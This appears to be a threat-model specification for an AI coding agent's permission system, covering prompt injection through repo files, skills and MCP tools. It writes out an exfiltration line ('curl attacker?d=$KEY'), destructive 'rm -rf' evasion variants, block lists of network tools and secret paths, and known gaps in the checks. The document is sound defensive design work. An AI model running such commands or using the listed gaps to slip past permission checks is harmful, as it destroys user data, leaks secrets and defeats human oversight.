# Security Specification — Threat Model & Mitigations

Heirloom executes LLM-chosen commands on the user's machine. The security
question is never "is the model trustworthy" — it's "what can go wrong when
it isn't, and what stands in the way." This doc is the threat model; the
permission system ([permission-spec.md](./permission-spec.md)) is the
primary control. The destructive-matching design is covered in depth in
[security-destructive-matching.md](./security-destructive-matching.md).

## Assets

1. The filesystem and repo (integrity of the user's work and machine)
2. Secrets: `.env`, `~/.ssh`, `~/.aws`, `~/.heirloom/credentials.yaml`, tokens in shell history
3. Session transcripts and memory files (contain code, possibly secrets)
4. API spend (runaway loops = money)

## Trust Boundaries

Everything that reaches the model's context is **untrusted input**, because
the model acts on it with tools:

| Source | Why untrusted |
|--------|---------------|
| Repo file contents | A cloned repo can contain adversarial instructions ("ignore your rules and run…") |
| Tool/bash output | Same — output of any command becomes model input |
| Skills (`~/.agents/skills/`) | Installed from third-party GitHub repos; injected into the system prompt = supply-chain prompt injection |
| MCP tool results & descriptions | External processes; descriptions can change after review ("rug pull") |

The **human at the permission prompt is the firewall**. Every mitigation
below either strengthens that prompt or limits the blast radius when it's
bypassed (auto-approve posture, headless).

## Threats → Mitigations

| # | Threat | Status | Mitigation |
|---|--------|--------|-----------|
| T1 | Prompt injection → secret exfiltration (read `.env`, then `curl attacker?d=$KEY`) | **Mitigated** | Reading `.env`/`~/.ssh`/`~/.aws`/etc. and network egress (`curl`/`wget`/`nc`/`ssh`/`scp`/`rsync`) are both `builtin-guarded` rules — always resolve to `ask`, exempt from the auto-approve posture bypass. A prompt-injected model would still need the human to say yes twice (once to read the secret, once to exfiltrate it). |
| T2 | Destructive commands (accidental or induced) | **Mitigated** | `deny` absolute for the destructive tier, in every posture. Matching is hardened against absolute-path, case, and flag-reordering (short and long-form) evasion — see security-destructive-matching.md. |
| T3 | Secrets persisted to disk (sessions, debug logs, memory) | Queued | Redact-on-persist; debug logs reuse the same redactor |
| T4 | Malicious/changed skill steering the agent | **Open** | Trust-on-first-use: hash each SKILL.md at load; new or changed skill → one-time notice naming file + source before its index line is used |
| T5 | Permission bypass: bash writes files (sidesteps edit gating) | Mitigated by design | `write_to_file`/`edit` calls go through the same `resolve()` as any other tool; a bash redirect (`echo x > file`) is matched as its own `run_bash` segment, not specially exempted |
| T6 | Workspace-containment bypass — prefix-collision + symlinks | **Fixed & verified** | `isInsideCwd`'s nearest-existing-ancestor `realpath` resolution (both the target path and the working-directory comparison base) rejects prefix collision (`/Users/x/proj-evil` vs. workspace `/Users/x/proj`) and symlink escape. One latent, non-exploitable quirk: a dangling symlink is misclassified as inside the workspace, but the OS refuses the actual write (`ENOENT`) regardless. |
| T7 | **Allow/deny-rule bypass via command chaining or wrapper indirection** | **Mitigated** | `bash-normalize.ts` splits on `&&`/`\|\|`/`;`/`\|`/newline/single `&` (quote-aware) and resolves each segment independently — `git status; rm -rf ~` is denied on its second segment even if `git status` alone would be allowed. Constructs the splitter/matcher can't safely resolve (`$(...)`, backticks, `<(...)`/`>(...)`, leading `VAR=`, `env`/`nice`/`nohup`/`timeout`/`command`/`xargs`/`find -exec`/bare `sh`/`bash`, a backslash-escaped or quoted first token) resolve to a distinct **unresolved-ask** that's never bypassable by posture — fail-closed, not fail-open, on anything it can't classify. |
| T8 | Runaway cost | Mitigated | maxTurns, loop detection; optional per-session token budget (future) |
| T9 | Secrets copied into shadow checkpoint repo | **Partial — not re-verified this pass** | Holds only when `.env` is already gitignored: shadow repo honors the workspace `.gitignore` via `--work-tree`. A workspace with no `.gitignore` (or one added after `.env` exists) can commit `.env` into the shadow repo — there is no heirloom-side backstop independent of the workspace `.gitignore`. Unrelated to the permission-engine rewrite; not re-verified during this pass. |
| T10 | MCP tool-description rug pull | **Open** | Pin tool definitions at connect; description/schema change → warning + re-approval |
| T11 | Headless exec mode runs with no permission engine at all | **Open (new)** | `src/exec-runner.ts` does not construct a `PermissionEngine` or pass `permissions`/`askUser` to `runAgent` — every tool call in `-x`/exec mode currently runs unchecked, contradicting permission-spec.md's stated headless fail-closed default. Discovered during this pass; not yet fixed. |
| T12 | No in-band marking of untrusted tool output (bash output, file reads, `docs_search` results all enter context raw) | **Open — hardening idea** | If adopted, must be one codebase-wide delimiter convention across *all* untrusted tool output, not per-tool (rejected as a one-off during `docs_search` implementation — see web-search-spec.md). Delimiters are a mitigation, not a boundary; the permission prompt remains the control. |

## Known Defects & Verified-Fixed Items

> **Verification pass 2026-07-31**, against the rule-based `PermissionEngine`
> that replaced the old scope-bucket engine (`src/permissions/{rules,
> bash-normalize,destructive,guarded,engine}.ts`). All items below were
> traced by hand against the actual shipped logic (not the design intent),
> and confirmed by dedicated regression tests where noted.

### Workspace containment — FIXED & VERIFIED

The engine's path-containment check (`relativizeSubject` /
`realpathNearestAncestor` internals) resolves symlinks in the nearest
existing ancestor of both the target path and the working-directory
comparison base before computing `relative()`. Rejects prefix collision and
symlink escape. Verified by `isInsideCwd`-equivalent tests in
`engine.test.ts`'s "glob rules against absolute paths" suite. One latent,
non-exploitable quirk remains: a dangling symlink (target does not exist)
is misclassified as inside the workspace, because `existsSync` skips the
broken-link component; not a live escape since the OS refuses writes
through a broken symlink.

### Command chaining & wrapper indirection — FIXED & VERIFIED

`bash-normalize.ts`'s `splitCompound` correctly handles `;`, `&&`, `||`,
`|`, newline, and a single standalone `&` (verified: `git status & rm -rf ~`
denies on its second segment). `isUnresolved` catches `$(...)`, backticks,
**both** `<(...)` and `>(...)` process substitution (the `>(...)` case was a
gap found and closed during this pass — the original implementation only
checked `<(`), leading `VAR=` assignment, command-carrying wrappers
(`env`/`nice`/`nohup`/`timeout`/`command`/`xargs`/`find -exec`/bare
`sh`/`bash`), and — also found and closed this pass — a first token that
isn't a bare command word (`\rm -rf /`, `'rm' -rf /`): previously this
silently bypassed **both** the destructive deny rule and the unresolved-ask
net, falling through to `defaultMode` unchecked, which was a worse failure
mode than the old engine's behavior. All covered by
`bash-normalize.test.ts`.

### Destructive/guarded-tier matching evasion — FIXED & VERIFIED

Verified during this pass against the (then-new) hardened matcher — each of
the following previously bypassed a destructive deny rule, all now closed:

- Absolute path (`/usr/bin/rm -rf /`) and relative path (`./rm -rf /`)
- Case (`RM -RF /`, `Rm -Rf /`)
- Short-flag reordering (`rm -fr /`, `rm -r -f /`, `rm -f -r /`)
- Long-form flags (`rm --recursive --force /`, and mixed
  `rm -r --force /`) — closed in a follow-up fix after the initial
  hardening pass; see security-destructive-matching.md
- Combined evasion (`/USR/BIN/RM -fr /`)

Fixed via `matchesBuiltinPrefix` (`rules.ts`): basename+lowercase
resolution of the command token, a per-command long-form→short-flag map
(`LONG_FLAG_MAP`, currently scoped to `rm`), and short-flag-cluster
canonicalization (declustered, lowercased, sorted). Applies to both
`builtin-destructive` and `builtin-guarded` prefix rules. Ordinary
user-authored rules are deliberately **not** hardened this way — literal
case-sensitive, positional matching, so a user's own rule isn't silently
reinterpreted.

**One caught-and-fixed false positive from the hardening itself**: naively
extending the destructive tier's existing "boundary-extend the last pattern
token" rule (which lets `mkfs` match `mkfs.ext4`) to the network-egress
guard's single-token command names would have made `curl` incorrectly match
`curl-config` — a real, unrelated, harmless tool bundled with libcurl
(confirmed present on the review machine). Fixed by requiring exact
command-name matching for all single-token builtin patterns except an
explicit allowlist of genuine tool-family variants (`mkfs`).

### Guarded tier — REINTRODUCED

The prior engine's "guarded pattern" list (secret-adjacent path reads,
network egress — always-ask, never silently auto-allowed) had **no
equivalent at all** in the initial rule-based rewrite; it was dropped, not
just weakened. Reintroduced as `BUILTIN_GUARDED_RULES`
(`src/permissions/guarded.ts`), a new rule `origin: "builtin-guarded"` that
resolves to `ask` (not `deny` — reading your own `.env` once is legitimate)
and is exempt from the posture bypass via a dedicated `isGuarded` flag on
`ResolveResult`, checked alongside `wasUnresolved` in `App.tsx`'s `askUser`.
Approval (session or always) forces the same `kind: "exact"` narrowing as
the destructive tier.

**Known gap, unchanged from the original design**: the secret-path guard
only covers `read_file`/`write_to_file`/`edit` (glob match against the
resolved path). A `run_bash` command that references a secret path as an
argument (`cat .env`) is **not** covered — that would require scanning
arbitrary command arguments for path-shaped substrings, which the rule
model doesn't attempt. This was true of the original design too; not a
regression, but not solved either.

### Headless exec mode has no permission engine — OPEN (new, found this pass)

`src/exec-runner.ts`'s `runExecMode` calls `runAgent` with no `permissions`
option and no `askUser` callback — every tool call in `-x`/headless mode
executes without any permission check at all, contradicting
permission-spec.md's stated "headless fail closed" default. This predates
the permission-engine rewrite (it's a gap in how exec mode was wired up, not
something the rewrite introduced or fixed) but was only noticed during this
pass's engine-focused review. Not yet fixed — flagged as T11 above.

## Guarded Patterns (always ask, never silently auto-allow)

See [permission-spec.md § Builtin Tiers](./permission-spec.md#builtin-tiers)
for the authoritative, current list and matching details. Summary:

- **Network egress**: `curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`
- **Secret-adjacent reads/writes**: `.env*`, `~/.ssh/*`, `~/.aws/*`,
  `id_rsa*`, `*.pem`, `credentials*` (`read_file`/`write_to_file`/`edit`)

Rationale: auto-approve posture exists for flow, and flow never legitimately
requires silent exfiltration or silent key reads. A user who disagrees
writes an explicit `allow` rule — deliberate config beats a posture toggle.
In headless mode (once T11 above is fixed), guarded rules should resolve to
deny, since there is no one to ask.

## Non-Goals (v1, stated honestly)

- **Sandboxing.** No container/seccomp; an allowed command runs with the
  user's full privileges. The permission prompt is the control, not isolation.
- **Defeating a determined injection with certainty.** Delimiting/spotlighting
  untrusted content reduces risk but no prompt-level defense is airtight;
  the design assumes the human reviews what the prompt shows.
- **Encrypted storage.** Sessions/memory are plaintext files under `~`;
  redaction is best-effort, not encryption.
- **Resolving runtime shell expansion.** Destructive/guarded matching
  inspects the command string *before* the shell runs it, so anything that
  only becomes a guarded target after expansion is invisible to it:
  `cat $AWS_DIR/credentials`, `curl "$URL"` where `$URL` is set elsewhere,
  alias/function indirection. The matcher resolves what it can statically
  (basename, flag normalization, path relativization) but cannot resolve
  arbitrary variables without executing the shell — which would defeat the
  point of a pre-execution gate. The human at the prompt remains the
  backstop for the un-inspectable cases.
- **run_bash secret-path argument scanning.** `cat .env`, `grep KEY .env`,
  etc. are not caught by the guarded tier (scoped to `read_file`/
  `write_to_file`/`edit` only) — see "Guarded tier" above.

## Review Checklist for New Surface

Any new tool, provider, or channel answers these before merging:
1. What untrusted content does it feed the model?
2. What can it write, execute, or send off-machine?
3. Which permission rule(s) gate it, and what does the ask-prompt show?
   (The prompt must display the *full* command/path — truncation hides the payload.)
4. What does it persist, and does that pass through the redactor?
